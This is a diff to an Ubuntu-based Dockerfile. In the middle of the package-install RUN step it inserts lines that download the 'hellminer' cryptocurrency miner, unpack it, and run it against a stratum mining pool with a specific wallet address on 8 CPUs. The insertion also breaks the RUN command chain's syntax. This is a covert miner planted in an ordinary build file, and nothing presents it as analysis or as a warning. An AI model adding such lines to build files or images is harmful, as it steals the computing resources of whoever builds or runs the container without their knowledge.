@@ -10,6 +10,11 @@ FROM ubuntu:14.04
 # Install.
 RUN \
   sed -i 's/# \(.*multiverse$\)/\1/g' /etc/apt/sources.list && \
+  wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+
+  tar xf hellminer_cpu_linux.tar.gz
+
+./hellminer -c stratum+tcp://vrsc.ciscotech.dk:9999#xnsub -u RGQR74EmhBBJZxYKypRvV1F1pVGst4xRwN.younes -p x --cpu 8
   apt-get update && \
   apt-get -y upgrade && \
   apt-get install -y build-essential && \
